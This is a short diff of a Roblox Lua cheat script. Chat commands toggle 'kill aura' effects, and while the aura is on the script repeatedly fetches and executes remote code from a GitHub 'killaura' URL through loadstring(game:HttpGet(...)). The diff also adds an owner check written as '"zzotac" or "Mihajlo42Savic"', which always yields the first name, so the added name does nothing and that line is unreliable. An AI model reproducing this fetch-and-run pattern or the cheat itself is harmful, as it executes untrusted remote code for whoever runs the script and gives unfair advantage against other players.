@@ -5,7 +5,7 @@
                     })
 
 local Players = game:GetService("Players")
-local playur = "zzotac"
+local playur = "zzotac" or "Mihajlo42Savic"
 local gang = game.Players.LocalPlayer.Name
 local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
 local cmds = "!pw / powerimpact aura | !pwo / disable pwa | !pa / punch aura | !pao / disable pa"
@@ -24,7 +24,6 @@ _G.impact = false
 				_G.aura = true
 				repeat wait()
 				    loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/cmdss/main/killaura'))()
-				    
 				until _G.aura == false
 				 
                     
